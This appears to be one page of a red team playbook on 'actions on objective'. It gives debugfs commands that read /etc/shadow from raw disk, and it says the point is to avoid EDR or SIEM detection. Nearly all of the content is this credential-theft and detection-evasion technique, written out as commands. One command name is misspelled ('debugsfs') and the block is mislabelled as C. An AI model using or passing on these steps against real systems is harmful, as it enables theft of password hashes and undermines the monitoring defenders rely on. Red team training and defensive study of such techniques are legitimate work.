# 7 Actions on Objective

## Table of Contents

- [Read sensitive Files](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/7-Actions-on-Objective/7-Actions-on-Objective.md#Read-sensitive-Files)

## Read sensitive Files

To avoid that EDR or SIEM flagging Linux commands when reading sensitive files like /etc/shadow, the files should be read from raw disk.

```c
$ df /
$ debugsfs
debugfs: open /dev/sda2
debugfs: cd /etc
debugfs: cat shadow
```

### Previous

- [6 Command-and-Control](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/6-Command-and-Control/6-Command-and-Control.md)

### Next

- [7.1 Post Exploitation](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/7-Actions-on-Objective/7.1-Post-Exploitation.md)
- [7.2 Exfiltration](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/7-Actions-on-Objective/7.2-Exfiltration.md)
